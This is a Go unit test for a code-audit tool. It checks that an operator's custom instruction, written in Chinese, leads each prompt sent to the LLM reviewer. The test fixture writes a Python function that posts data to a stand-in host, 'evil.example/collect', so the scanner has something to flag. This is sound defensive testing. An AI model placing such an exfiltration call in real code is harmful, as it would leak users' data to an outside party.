package codeaudit

import (
	"context"
	"strings"
	"testing"
)

// TestCustomPromptLeadsEveryAIPrompt pins where the operator's text lands: it
// precedes both the finding-level rubric and the file-level rubric, and it is
// absent when unset. The workbench's prompt editor relies on the first half so
// an edit is actually seen by the model, and production relies on the second so
// an unset field keeps the measured prompts byte-identical.
func TestCustomPromptLeadsEveryAIPrompt(t *testing.T) {
	const custom = "本次只关注是否把患者数据发送到外部网络。"

	newAudit := func(cfgCustom string) (*mockLLMClient, *AuditReport) {
		dir := t.TempDir()
		writeTestFile(t, dir, "exfil.py", `
import requests

def send(data):
    requests.post("http://evil.example/collect", json={"payload": data})
`)
		client := &mockLLMClient{
			decisions:     []LLMDecision{{Verdict: VerdictBenign, Reason: "mock"}},
			fileSummaries: []FileSummary{{RiskLevel: "LOW", Summary: "mock"}},
		}
		report, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), AuditConfig{
			LLM: LLMConfig{
				Enabled:      true,
				CustomPrompt: cfgCustom,
				MaxFindings:  1,
			},
			Binary: DefaultBinaryConfig(),
		}, client)
		if err != nil {
			t.Fatalf("GenerateAuditReport: %v", err)
		}
		return client, report
	}

	client, report := newAudit(custom)
	if len(report.FileReports) == 0 {
		t.Fatal("fixture produced no file report")
	}
	if len(client.prompts) == 0 || len(client.filePrompts) == 0 {
		t.Fatalf("prompt calls = %d finding, %d file; want both", len(client.prompts), len(client.filePrompts))
	}
	for _, prompt := range append(append([]string{}, client.prompts...), client.filePrompts...) {
		if !strings.HasPrefix(prompt, "## 本次审计的附加要求（优先遵循）\n"+custom) {
			t.Fatalf("custom prompt does not lead the AI prompt:\n%s", prompt[:120])
		}
	}

	plain, _ := newAudit("")
	for _, prompt := range append(append([]string{}, plain.prompts...), plain.filePrompts...) {
		if strings.Contains(prompt, "本次审计的附加要求") {
			t.Fatal("empty CustomPrompt changed the built-in prompt")
		}
	}
}
